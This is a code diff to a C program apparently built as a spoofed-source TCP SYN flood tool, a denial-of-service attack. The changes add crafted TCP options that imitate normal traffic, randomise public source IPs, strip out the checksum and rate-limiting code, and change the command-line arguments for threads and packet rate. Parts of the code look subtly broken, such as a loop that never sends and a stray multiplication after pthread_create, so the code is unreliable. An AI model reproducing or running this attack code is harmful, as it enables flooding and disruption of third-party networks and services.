@@ -133,6 +133,17 @@ unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
 	return output;
 }
 
+struct pseudo_header    //needed for checksum calculation
+{
+	unsigned int source_address;
+	unsigned int dest_address;
+	unsigned char placeholder;
+	unsigned char protocol;
+	unsigned short tcp_length;
+	
+	struct tcphdr tcp;
+};
+
 void setup_ip_header(struct iphdr *iph)
 {
 	iph->ihl = 5;
@@ -166,6 +177,8 @@ void *flood(void *par1)
 	char datagram[MAX_PACKET_SIZE];
 	struct iphdr *iph = (struct iphdr *)datagram;
 	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
+	struct pseudo_header psh;
+	opts = (uint8_t *)(tcph + 1);
 	
 	struct sockaddr_in sin;
 	sin.sin_family = AF_INET;
@@ -192,11 +205,45 @@ void *flood(void *par1)
 		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
 		exit(-1);
 	}
+	
+        psh.source_address = getRandomPublicIP();
+	psh.dest_address = sin.sin_addr.s_addr;
+	psh.placeholder = 0;
+	psh.protocol = IPPROTO_TCP;
+	psh.tcp_length = htons(20);
+	
+	// TCP MSS
+        *opts++ = PROTO_TCP_OPT_MSS;    // Kind
+        *opts++ = 4;                    // Length
+        *((uint16_t *)opts) = htons(1400 + (rand() & 0x0f));
+        opts += sizeof (uint16_t);
 
-	init_rand(time(NULL));
+        // TCP SACK permitted
+        *opts++ = PROTO_TCP_OPT_SACK;
+        *opts++ = 2;
+
+        // TCP timestamps
+        *opts++ = PROTO_TCP_OPT_TSVAL;
+        *opts++ = 10;
+        *((uint32_t *)opts) = rand();
+        opts += sizeof (uint32_t);
+        *((uint32_t *)opts) = 0;
+        opts += sizeof (uint32_t);
+
+        // TCP nop
+        *opts++ = 1;
+
+        // TCP window scale
+        *opts++ = PROTO_TCP_OPT_WSS;
+        *opts++ = 3;
+        *opts++ = 6; // 2^6 = 64, window size scale = 64
+	
 	register unsigned int i;
 	i = 0;
-	while(1){
+	while(1)
+	{
+            for(i=0;i < 950000000;i++)
+	    {
 		in_addr_t netmask;
 
                 if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
@@ -206,19 +253,14 @@ void *flood(void *par1)
 
 		iph->saddr = htonl( getRandomPublicIP() );
 		iph->id = htonl(rand());
-		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
+		iph->check = 0;
 		tcph->seq = htons(1337);
 		tcph->source = htons(rand());
 		tcph->check = 0;
-		tcph->check = tcpcsum(iph, tcph);
-		
-		pps++;
-		if(i >= limiter)
-		{
-			i = 0;
-			usleep(sleeptime);
-		}
-		i++;
+	    }
+		break;
+                if (errno != 0)
+                    printf("errno = %d\n", errno);
 	}
 }
 int main(int argc, char *argv[ ])
@@ -231,10 +273,10 @@ int main(int argc, char *argv[ ])
 
 	fprintf(stdout, "Setting up Sockets...\n");
 
-	int num_threads = atoi(argv[5]);
+	int num_threads = atoi(argv[3]);
 	floodport = atoi(argv[2]);
 	spoofit = atoi(argv[4]);
-	int maxpps = atoi(argv[6]);
+	int maxpps = atoi(argv[5]);
 	limiter = 0;
 	pps = 0;
 	pthread_t thread[num_threads];
@@ -246,7 +288,7 @@ int main(int argc, char *argv[ ])
 		pthread_create( &thread[i], NULL, &flood, (void *)argv[1]) * 4096;
 	}
 	fprintf(stdout, "Starting Flood...\n");
-	for(i = 0;i<(atoi(argv[7])*multiplier);i++)
+	for(i = 0;i<(atoi(argv[6])*multiplier);i++)
 	{
 		usleep((1000/multiplier)*1000);
 		if((580000000*multiplier) > maxpps)
